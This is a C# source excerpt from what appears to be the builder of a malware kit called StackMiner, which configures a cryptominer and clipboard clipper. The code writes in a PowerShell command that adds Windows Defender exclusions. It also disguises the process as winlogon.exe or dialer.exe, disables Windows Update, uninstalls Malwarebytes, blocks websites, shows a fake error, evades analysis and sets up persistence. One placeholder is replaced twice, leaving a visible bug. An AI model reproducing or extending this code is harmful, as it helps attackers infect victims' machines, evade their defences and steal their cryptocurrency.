...
namespace StackMiner
{
    public class Codedom
    {
        ...
        public static AdministratorOptions FAO;
        ...
        static string HashString(string input)
        {
            ...
            {
                byte[] inputBytes = Encoding.UTF8.GetBytes(input.ToLower());
                rgbHash = sha256.ComputeHash(inputBytes);
            }

            StringBuilder result = new StringBuilder();
            foreach (byte b in rgbHash)
            {
        ...
        public static string ReplaceGlobals(string code, bool replaceAntiVM = false)
        {
            StringBuilder stringb = new StringBuilder(code);

            if (FAO.toggleWDExclusions.Checked)
            {
                stringb.Replace("DefWDExclusions", "true");
                stringb.Replace("#WDCOMMAND", $"Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramData) -ExclusionExtension '.exe' -ExclusionProcess {(F.FormAO.toggleRootkit.Checked ? "'dialer.exe'" : "'winlogon.exe'")} -Force");
            }

            if (F.chkAntiUsername.Checked && !string.IsNullOrEmpty(F.txtAntiUsername.Text))
            {
                stringb.Replace("DefAntiUsername", "true");
                string[] usernamesList = F.txtAntiUsername.Text.Split(',');
                if(usernamesList.Count() > 0)
                {
                    stringb.Replace("#USERNAMELIST", $"\"{string.Join("\", \" ", usernamesList.Select(HashString))}\"");
                }
            }
            ...
            SetDefine(stringb, "DefDisableWindowsUpdate", FAO.toggleWindowsUpdate.Checked);
            SetDefine(stringb, "DefProcessProtect", FAO.toggleProcessProtect.Checked);
            SetDefine(stringb, "DefRunAsAdministrator", F.toggleAdministrator.Checked);

            if (FAO.chkBlockWebsites.Checked && !string.IsNullOrEmpty(FAO.txtBlockWebsites.Text))
            {
                stringb.Replace("DefBlockWebsites", "true");

                string[] domainList = FAO.txtBlockWebsites.Text.Split(',');
                ...
                stringb.Replace("$DOMAINSIZE", (FAO.txtBlockWebsites.Text.Replace(",", "").Length + domainList.Length * 16).ToString());
            }
            ...
            if (F.chkStartup.Checked)
            {
                ...
                SetDefine(stringb, "DefRunInstall", F.toggleRunInstall.Checked);
            }

            if (F.chkFakeError.Checked && !string.IsNullOrEmpty(F.txtFakeErrorText.Text) && !string.IsNullOrEmpty(F.txtFakeErrorTitle.Text))
            {
                stringb.Replace("DefFakeError", "true");
                stringb.Replace("#FAKEERRORTEXT", F.txtFakeErrorText.Text);
                stringb.Replace("#FAKEERRORTEXT", F.txtFakeErrorTitle.Text);
            }

            SetDefine(stringb, "DefClipper", F.chkClipper.Checked);
            SetDefine(stringb, "DefUninstallMB", FAO.chkUninstallMB.Checked);
            SetDefine(stringb, "DefAntiAnalysis", F.chkAntiAnalysis.Checked);
            ...
            stringb.Replace("#CLIPPERID", F.clipperID);
            ...
            stringb.Replace("#WINLOGONPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\winlogon.exe");
